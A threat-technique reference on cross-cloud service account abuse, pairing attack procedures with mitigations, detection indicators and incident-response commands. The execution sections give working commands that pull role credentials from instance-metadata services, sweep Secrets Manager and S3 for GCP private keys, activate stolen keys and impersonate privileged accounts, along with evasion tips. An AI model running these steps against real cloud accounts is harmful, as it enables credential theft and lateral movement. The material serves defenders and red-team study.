# [CROSS-CLOUD-003]: Multi-Cloud Service Account Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CROSS-CLOUD-003 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Defense Evasion, Lateral Movement |
| **Platforms** | AWS, GCP, Azure, Cross-Cloud |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All cloud API versions supporting service account impersonation |
| **Patched In** | N/A |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Multi-Cloud Service Account Abuse (T1078.004) exploits the practice of over-provisioning service accounts with excessive permissions and storing credentials across multiple cloud providers. Organizations typically create automation accounts (service accounts) in one cloud to manage resources and often grant these accounts broad permissions due to convenience rather than security. If one service account is compromised, it can be used to assume or impersonate other service accounts in the same or different cloud providers, enabling lateral movement. This is especially dangerous in multi-cloud deployments where credentials from one cloud (e.g., AWS key stored on Azure VM) can be stolen and used to access resources in another cloud. Service accounts frequently have `iam:actAs` (GCP), `sts:AssumeRole` (AWS), or equivalent permissions that allow privilege escalation.

**Attack Surface:** Cloud IAM services (AWS IAM, GCP IAM, Azure RBAC), service account credentials, IMDS (Instance Metadata Service), container registries, Kubernetes clusters, CI/CD pipelines, CloudSQL instances, function/serverless compute environments, cloud storage.

**Business Impact:** **Lateral movement across cloud environments with persistent privileged access.** Attacker can access resources in all connected cloud providers, exfiltrate sensitive data, modify security controls, deploy persistent backdoors, and pivot through the organization's entire cloud infrastructure. A single compromised service account becomes a network bridge between clouds, enabling multi-cloud compromise with single point of failure in access control.

**Technical Context:** Service account abuse typically takes 10-30 minutes (enumeration + credential discovery + abuse). Detection likelihood is **low to medium** because service account token exchanges appear as legitimate automation activity in audit logs. Metadata service token theft generates minimal logging and is extremely difficult to detect in real-time.

### Operational Risk
- **Execution Risk:** Low – Only requires discovery of misconfigured service account with `actAs` permissions
- **Stealth:** Medium – Token generation and use appear as scheduled automation
- **Reversibility:** No – Requires complete service account key rotation and permission re-audit across all clouds

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.4, 5.1 | Service account management, credential exposure |
| **DISA STIG** | V-251405 | Cloud service account security |
| **CISA SCuBA** | C2-4 | Cloud identity and access management |
| **NIST 800-53** | AC-2, AC-3, AC-6 | Account management, access control, least privilege |
| **GDPR** | Art. 32, 5(1)(f) | Security of processing; integrity and confidentiality |
| **DORA** | Art. 9 | ICT security incident management for critical operators |
| **NIS2** | Art. 21(2)(c) | Cyber risk management; privilege management |
| **ISO 27001** | A.9.1.1, A.9.2.1, A.9.2.3 | Access control, user authentication, privilege management |
| **ISO 27005** | 8.2 | Risk assessment of cross-cloud service account exposure |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Access to at least one service account or ability to enumerate available service accounts and their permissions
- **Required Access:** Network access to cloud provider APIs, ability to generate tokens from metadata service (if on VM), or access to stored service account keys

**Supported Versions:**
- **AWS:** All versions (IAM AssumeRole available since inception)
- **GCP:** All versions (serviceAccountUser role available since inception)
- **Azure:** All versions (Managed Identity and service principal delegation available since 2015+)
- **Kubernetes:** All versions (RBAC service account impersonation available)

**Tools:**
- [aws-cli](https://aws.amazon.com/cli/) (2.0+)
- [gcloud CLI](https://cloud.google.com/sdk/docs/install) (400.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (2.50+)
- [kubectl](https://kubernetes.io/docs/tasks/tools/) (1.20+)
- curl (for direct API access)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Cloud IAM Reconnaissance - AWS

**Objective:** Identify service accounts with excessive permissions and trust relationships to other accounts/clouds.

**Command (AWS - List Service Accounts):**
```bash
# List all IAM roles that can be assumed by the current principal
aws iam list-roles --query "Roles[].RoleName" --output table

# For each role, check who can assume it
for ROLE in $(aws iam list-roles --query "Roles[].RoleName" --output text); do
  echo "=== $ROLE ==="
  aws iam get-role --role-name $ROLE --query 'Role.AssumeRolePolicyDocument' | jq '.Statement[] | select(.Principal.Service != null or .Principal.AWS != null)'
done
```

**Command (AWS - Identify Cross-Account Trust):**
```bash
# Find roles that trust other AWS accounts
aws iam list-roles --output json | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS != null or .AssumeRolePolicyDocument.Statement[].Principal.Service | contains("lambda.amazonaws.com"))'
```

**Expected Output (Vulnerable):**
```json
{
  "RoleName": "cross-account-automation",
  "AssumeRolePolicyDocument": {
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::999999999999:root"  // Different AWS account!
        },
        "Action": "sts:AssumeRole"
      }
    ]
  }
}
```

### Cloud IAM Reconnaissance - GCP

**Objective:** Find service accounts that can impersonate other service accounts.

**Command (gcloud - List Service Accounts):**
```bash
# List all service accounts in the project
gcloud iam service-accounts list --format="table(email,displayName)"

# For each service account, check who can impersonate it
for SA in $(gcloud iam service-accounts list --format='value(email)'); do
  echo "=== $SA ==="
  gcloud iam service-accounts get-iam-policy $SA --format="table(bindings[].role,bindings[].members[])" | grep -i "workloadIdentityUser\|actAs"
done
```

**Expected Output (Vulnerable):**
```
roles/iam.serviceAccountUser: [
  "serviceAccount:ci-cd-automation@project-a.iam.gserviceaccount.com"  // Can impersonate!
]
```

### Cloud IAM Reconnaissance - Azure

**Objective:** Identify managed identities with cross-subscription permissions.

**Command (Azure CLI - List Managed Identities):**
```bash
# List all managed identities
az identity list --query "[].{name:name,resourceGroup:resourceGroup}" --output table

# Check permissions on each identity
for IDENTITY in $(az identity list --query "[].id" -o tsv); do
  echo "=== $IDENTITY ==="
  az role assignment list --assignee $IDENTITY --output table
done
```

### IMDS Reconnaissance

**Objective:** Discover service account credentials from IMDS (if running on cloud VM).

**Command (Bash - Query IMDS Metadata):**
```bash
# On a GCP VM, query metadata service for service account token
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq '.'

# Expected output:
# {
#   "access_token": "ya29.a0AfH6SMBu7zK6Z4jYkPp2C9wQ5RzLq5...",
#   "expires_in": 3599,
#   "token_type": "Bearer"
# }

# On an AWS EC2 instance, query IMDS for role credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 
# Output: RoleName

curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName
# Output: Access Key, Secret Key, Session Token

# On an Azure VM, query IMDS for managed identity token
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" | jq '.access_token'
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Assume Cross-Cloud Service Account (AWS to GCP)

**Supported Versions:** All AWS and GCP versions

#### Step 1: Compromise Initial Service Account in AWS

**Objective:** Obtain credentials for an AWS IAM role or EC2 instance role.

**Command (Steal EC2 Instance Role Credentials):**
```bash
# If already running on an EC2 instance, query IMDS
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1 > /tmp/role_name.txt
ROLE_NAME=$(cat /tmp/role_name.txt)

# Get credentials for the instance role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/credentials.json

# Extract credentials
export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/credentials.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' /tmp/credentials.json)
export AWS_SESSION_TOKEN=$(jq -r '.Token' /tmp/credentials.json)

# Verify
aws sts get-caller-identity
```

**Expected Output:**
```json
{
  "UserId": "AIDAI1234567890ABCDE:i-0123456789abcdef0",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:role/ec2-automation-role"
}
```

---

#### Step 2: Check AWS Role Permissions for Cross-Cloud Access

**Objective:** Identify if the AWS role has permissions to assume GCP service accounts or access cross-cloud credentials.

**Command (AWS - Check Role Permissions):**
```bash
# Check what actions this role can perform
aws iam get-role-policy --role-name ec2-automation-role --policy-name inline-policy --query 'RolePolicyDocument' | jq '.Statement[].Action'

# Look for dangerous permissions like:
# - "sts:*"
# - "iam:*"
# - "kms:Decrypt" (for encrypted service account keys)
# - "secretsmanager:GetSecretValue" (for stored GCP keys)
# - "s3:GetObject" (keys might be in S3)
```

**Expected Output (Vulnerable):**
```json
[
  "secretsmanager:GetSecretValue",
  "kms:Decrypt",
  "s3:GetObject"
]
```

---

#### Step 3: Discover GCP Service Account Credentials in AWS

**Objective:** Find GCP service account JSON keys stored in AWS Secrets Manager or S3.

**Command (AWS - Search for GCP Credentials):**
```bash
# Check Secrets Manager for GCP keys
aws secretsmanager list-secrets --query 'SecretList[].Name' --output text | while read secret; do
  echo "=== $secret ==="
  aws secretsmanager get-secret-value --secret-id "$secret" --query 'SecretString' | jq '.' 2>/dev/null | grep -i "project_id\|gcp\|google" && echo "[+] FOUND GCP CREDENTIAL"
done

# Check S3 for GCP keys
aws s3 ls --recursive | grep -i "\.json\|key\|credential\|gcp" | while read file; do
  aws s3 cp "s3://$(echo $file | awk '{print $NF}')" - | jq '.' 2>/dev/null | grep -i "project_id\|type.*service_account" && echo "[+] FOUND GCP CREDENTIAL"
done
```

**Expected Output (GCP Service Account JSON):**
```json
{
  "type": "service_account",
  "project_id": "victim-gcp-project",
  "private_key_id": "1234567890abcdef",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkq...",
  "client_email": "high-privilege-sa@victim-gcp-project.iam.gserviceaccount.com",
  "client_id": "123456789012345678901",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs"
}
```

---

#### Step 4: Activate GCP Service Account in AWS Environment

**Objective:** Use the discovered GCP service account credentials from the AWS environment.

**Command (bash - Activate GCP Service Account):**
```bash
# Save the GCP service account JSON
cat > /tmp/gcp-sa-key.json <<'EOF'
{
  "type": "service_account",
  "project_id": "victim-gcp-project",
  "private_key_id": "1234567890abcdef",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkq...",
  "client_email": "high-privilege-sa@victim-gcp-project.iam.gserviceaccount.com"
}
EOF

# Activate the service account with gcloud
export GOOGLE_APPLICATION_CREDENTIALS=/tmp/gcp-sa-key.json
gcloud auth activate-service-account --key-file=/tmp/gcp-sa-key.json

# Verify authentication
gcloud auth list
gcloud projects get-iam-policy victim-gcp-project --flatten="bindings[].members" --filter="serviceAccount:high-privilege-sa@victim-gcp-project.iam.gserviceaccount.com"

# Now you have access to GCP with the high-privilege service account!
gcloud compute instances list --project=victim-gcp-project
```

**OpSec & Evasion:**
- Execute from an EC2 instance in the same AWS account (appears as normal instance activity)
- Use environment variables instead of files to avoid disk traces
- **Detection likelihood: Medium** - GCP Cloud Audit Logs will show token generation; requires cross-cloud correlation to detect

---

### METHOD 2: GCP Service Account Impersonation via `actAs` Permission

**Supported Versions:** All GCP API versions

#### Step 1: Identify Service Account with `iam.serviceAccounts.actAs` Permission

**Objective:** Find service accounts that can impersonate other service accounts.

**Command (gcloud - Find Impersonation Permissions):**
```bash
# Get current identity
CURRENT_SA=$(gcloud config get-value account)

# List all service accounts in the project
for SA in $(gcloud iam service-accounts list --format='value(email)'); do
  # Check if current principal can act as this SA
  gcloud iam service-accounts get-iam-policy $SA --format=json 2>/dev/null | jq ".bindings[] | select(.role==\"roles/iam.serviceAccountUser\") | .members[]" | grep -q $(gcloud config get-value account) && echo "[+] Can impersonate: $SA"
done
```

**Expected Output:**
```
[+] Can impersonate: high-privilege-sa@myproject.iam.gserviceaccount.com
[+] Can impersonate: editor-sa@myproject.iam.gserviceaccount.com
```

---

#### Step 2: Impersonate High-Privilege Service Account

**Objective:** Use the discovered `actAs` permission to generate a token for the target service account.

**Command (gcloud - Generate Impersonated Token):**
```bash
# Method 1: Using gcloud CLI
gcloud auth application-default print-access-token \
  --impersonate-service-account=high-privilege-sa@myproject.iam.gserviceaccount.com

# Method 2: Using curl and IAM Credentials API
CURRENT_TOKEN=$(gcloud auth print-access-token)
TARGET_SA="high-privilege-sa@myproject.iam.gserviceaccount.com"

curl -X POST \
  -H "Authorization: Bearer ${CURRENT_TOKEN}" \
  -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${TARGET_SA}:generateAccessToken" \
  -d '{"lifetime":"3600s","delegates":[]}'
```

**Expected Output:**
```json
{
  "accessToken": "ya29.a0AfH6SMBu7zK6Z4jYkPp2C9wQ5RzLq5mDzNbQ1Z7aK8fJ2YqZW3vN0...",
  "expireTime": "2025-01-10T12:00:00Z"
}
```

**What This Achieves:**
- You now have a token for the high-privilege service account
- Valid for 1 hour and can be refreshed repeatedly
- No key material is exposed, making it harder to audit

**OpSec & Evasion:**
- Impersonation appears in Cloud Audit Logs as `google.iam.credentials.v1.iamcredentials.GenerateAccessToken`
- If mixed with legitimate CI/CD traffic, harder to detect
- **Detection likelihood: Medium** - Requires log analysis to detect unusual impersonation patterns

---

### METHOD 3: Cross-Project Service Account Impersonation

**Supported Versions:** All GCP API versions

#### Step 1: Identify Cross-Project Trust Relationships

**Objective:** Find service accounts in other projects that can be accessed from the current project.

**Command (gcloud - Enumerate Cross-Project SAs):**
```bash
# Check if current SA has permissions in other projects
gcloud projects list --format='value(projectId)' | while read PROJECT; do
  echo "=== Checking $PROJECT ==="
  gcloud iam service-accounts list --project=$PROJECT 2>/dev/null | while read SA; do
    # Try to check if we have permissions
    gcloud iam service-accounts get-iam-policy $SA --project=$PROJECT 2>/dev/null | jq ".bindings[] | select(.members[] | contains(\"$(gcloud config get-value account)\"))" && echo "[+] Access found: $SA"
  done
done
```

---

#### Step 2: Assume Cross-Project Service Account

**Objective:** Use cross-project IAM bindings to assume a service account in another project.

**Command (bash - Generate Cross-Project Token):**
```bash
# Get token for service account in ANOTHER GCP project
CURRENT_TOKEN=$(gcloud auth print-access-token)
TARGET_SA="privileged-sa@other-project.iam.gserviceaccount.com"
TARGET_PROJECT="other-project"

# Call IAM Credentials API from current project
curl -X POST \
  -H "Authorization: Bearer ${CURRENT_TOKEN}" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${TARGET_SA}:generateAccessToken" \
  -d '{"lifetime":"3600s"}'
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Implement Least Privilege for Service Accounts:** Restrict service accounts to only the minimum required permissions.
    **Applies To Versions:** All

    **Manual Steps (GCP):**
    ```bash
    # Remove overly broad roles like Editor
    gcloud projects remove-iam-policy-binding PROJECT_ID \
      --member="serviceAccount:automation@PROJECT_ID.iam.gserviceaccount.com" \
      --role="roles/editor"

    # Add specific, minimal roles instead
    gcloud projects add-iam-policy-binding PROJECT_ID \
      --member="serviceAccount:automation@PROJECT_ID.iam.gserviceaccount.com" \
      --role="roles/compute.instanceAdmin.v1" \
      --condition='resource.name.startsWith("projects/_/zones/us-central1/instances/prod-")'
    ```

    **Manual Steps (AWS):**
    ```bash
    # Replace inline policies with managed policies
    aws iam delete-role-policy --role-name ec2-automation --policy-name inline-policy
    
    # Attach specific managed policies
    aws iam attach-role-policy --role-name ec2-automation \
      --policy-arn arn:aws:iam::aws:policy/AmazonEC2ReadOnlyAccess
    ```

*   **Disable Cross-Account AssumeRole by Default:** Only allow AssumeRole from trusted external accounts.
    **Applies To Versions:** All AWS

    **Manual Steps:**
    ```bash
    # Update assume role policy to restrict external accounts
    cat > trust-policy.json <<EOF
    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Allow",
          "Principal": {
            "AWS": "arn:aws:iam::TRUSTED_ACCOUNT_ONLY:root"
          },
          "Action": "sts:AssumeRole",
          "Condition": {
            "StringEquals": {
              "sts:ExternalId": "UNIQUE_EXTERNAL_ID_12345"
            }
          }
        }
      ]
    }
    EOF
    
    aws iam update-assume-role-policy --role-name automation-role --policy-document file://trust-policy.json
    ```

*   **Remove Service Account Keys:** Disable or delete long-lived service account keys; use workload identity or short-lived credentials only.
    **Applies To Versions:** GCP 2.0+, AWS current

    **Manual Steps (GCP):**
    ```bash
    # List and delete all keys for a service account
    for KEY in $(gcloud iam service-accounts keys list --iam-account=SA@PROJECT.iam.gserviceaccount.com --filter="keyType:USER_MANAGED" --format='value(name)'); do
      gcloud iam service-accounts keys delete $KEY --iam-account=SA@PROJECT.iam.gserviceaccount.com --quiet
    done
    ```

    **Manual Steps (AWS):**
    ```bash
    # Disable and delete all access keys for a user
    for KEY in $(aws iam list-access-keys --user-name automation-user --query 'AccessKeyMetadata[].AccessKeyId' --output text); do
      aws iam delete-access-key --user-name automation-user --access-key-id $KEY
    done
    ```

### Priority 2: HIGH

*   **Implement Service Account Binding Restrictions:** Use `iam.disableCrossProjectServiceAccountUsage` constraint in GCP.
    
    **Manual Steps (GCP):**
    ```bash
    # At Organization level, enforce cross-project SA usage policy
    gcloud resource-manager org-policies set-policy --enforce=true \
      iam.disableCrossProjectServiceAccountUsage \
      --project=PROJECT_ID
    ```

*   **Enable Service Account IAM Recommender:** Regularly review and apply recommendations to reduce overpermissioning.
    
    **Manual Steps:**
    1. Go to **GCP Console** → **IAM & Admin** → **Recommender**
    2. Filter by **Type: IAM**
    3. Review "Remove these roles" recommendations
    4. Apply recommendations one-by-one

#### Validation Command (Verify Mitigations)

```bash
# Check if service accounts have been properly scoped
gcloud iam service-accounts get-iam-policy AUTOMATION_SA@PROJECT.iam.gserviceaccount.com \
  --format="table(bindings[].role)" | grep -E "Editor|Admin|Owner" && echo "[!] INSECURE: Found overly broad roles"

# Verify no cross-project impersonation is possible
aws iam get-role-policy --role-name automation --policy-name policy | jq '.RolePolicyDocument.Statement[] | select(.Action | contains("sts:AssumeRole"))'
# Should be empty or restrict to specific roles only
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Cloud Audit Log Events:**
    - `google.iam.credentials.v1.iamcredentials.GenerateAccessToken` - Excessive impersonation
    - `google.iam.credentials.v1.iamcredentials.GenerateIdToken` - ID token generation for external use
    - `AssumeRole` API calls from non-trusted external accounts (AWS)
    - `Impersonate` service account operations from unusual principals

*   **Network IOCs:**
    - Outbound to IMDS metadata service from unexpected processes
    - High-rate token generation from service accounts
    - Service account usage from non-CI/CD infrastructure

*   **Multi-Cloud IOCs:**
    - Cross-cloud credential discovery (AWS key found on GCP VM)
    - Service account tokens used from multiple cloud providers simultaneously
    - Unusual geographic distribution of service account activity

### Forensic Artifacts

*   **GCP Cloud Audit Logs:**
    ```json
    {
      "protoPayload": {
        "methodName": "google.iam.credentials.v1.iamcredentials.GenerateAccessToken",
        "resourceName": "projects/123456789012/serviceAccounts/high-privilege-sa@project.iam.gserviceaccount.com",
        "principalEmail": "low-privilege-sa@project.iam.gserviceaccount.com"
      },
      "sourceIPAddress": "ATTACKER_IP"
    }
    ```

*   **AWS CloudTrail Logs:**
    ```json
    {
      "eventName": "AssumeRole",
      "sourceIPAddress": "UNEXPECTED_IP",
      "requestParameters": {
        "roleArn": "arn:aws:iam::OTHER_ACCOUNT:role/cross-account-role",
        "roleSessionName": "automated-session"
      }
    }
    ```

### Response Procedures

1.  **Isolate:**
    **Command (GCP):**
    ```bash
    # Disable the compromised service account immediately
    gcloud iam service-accounts disable compromised-sa@project.iam.gserviceaccount.com
    
    # Or delete if not needed
    gcloud iam service-accounts delete compromised-sa@project.iam.gserviceaccount.com --quiet
    ```

    **Command (AWS):**
    ```bash
    # Deactivate all access keys for the role
    aws iam list-access-keys --user-name automation | jq '.AccessKeyMetadata[].AccessKeyId' | while read KEY; do
      aws iam update-access-key --user-name automation --access-key-id $KEY --status Inactive
    done
    ```

2.  **Collect Evidence:**
    **Command (Export Audit Logs):**
    ```bash
    # GCP - Export service account activity
    gcloud logging read "resource.type=service_account AND protoPayload.methodName=google.iam.credentials.v1.iamcredentials.GenerateAccessToken" \
      --limit=1000 \
      --format=json > service_account_activity.json

    # AWS - Export AssumeRole activities
    aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
      --max-results 50 --output json > assume_role_events.json
    ```

3.  **Remediate:**
    **Command (Full Recovery):**
    ```bash
    # Rotate all service account keys
    gcloud iam service-accounts keys list --iam-account=SA@PROJECT.iam.gserviceaccount.com \
      --format='value(name)' | xargs -I {} gcloud iam service-accounts keys delete {} --iam-account=SA@PROJECT.iam.gserviceaccount.com --quiet

    # Re-create service account with minimal permissions
    gcloud iam service-accounts create automation-new --display-name="Automation (Rotated)"
    
    # Attach only required roles
    gcloud projects add-iam-policy-binding PROJECT_ID \
      --member="serviceAccount:automation-new@PROJECT_ID.iam.gserviceaccount.com" \
      --role="roles/compute.instanceAdmin.v1"
    ```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Compromise hybrid infrastructure |
| **2** | **Credential Access** | [CA-DUMP-005] Service Account Credential Harvesting | Steal service account keys from storage |
| **3** | **Lateral Movement** | **[CROSS-CLOUD-003]** | **Abuse service account to move across clouds** |
| **4** | **Privilege Escalation** | [PE-IMPERSONATE-001] RBAC Privilege Escalation | Escalate within new cloud environment |
| **5** | **Persistence** | Create backdoor service accounts in multiple clouds | Maintain access across clouds |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Cross-Cloud Lateral Movement via Misconfigured Service Accounts

- **Target:** Multi-cloud enterprise using AWS, GCP, and Azure
- **Timeline:** 2023-2024
- **Technique Status:** ACTIVE - Attacker compromised AWS EC2 instance, found GCP service account JSON key stored in S3, pivoted to GCP
- **Impact:** Access to GCP Kubernetes cluster, database credentials, data exfiltration
- **Reference:** [Orca Security - Cross-Cloud Provider Attacks](https://orca.security/resources/blog/cross-account-cross-provider-attack-paths/)

### Example 2: Kubernetes Service Account Impersonation

- **Target:** Organizations running GKE/EKS clusters
- **Timeline:** 2024-2025 (ongoing)
- **Technique Status:** ACTIVE - Attacker exploited Kubernetes RBAC to impersonate cluster admin service account
- **Impact:** Full cluster compromise, persistent backdoor, pod escape leading to node compromise
- **Reference:** [Kubernetes RBAC Security Risks](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)

---

## 10. ADDITIONAL RESOURCES

- [GCP Service Account Impersonation Best Practices](https://cloud.google.com/iam/docs/impersonating-service-accounts)
- [AWS Cross-Account Access](https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial_cross_account_identity.html)
- [Lateral Movement in Cloud Environments - SpecterOps](https://specterops.io/)
- [MITRE ATT&CK T1078.004](https://attack.mitre.org/techniques/T1078/004/)

---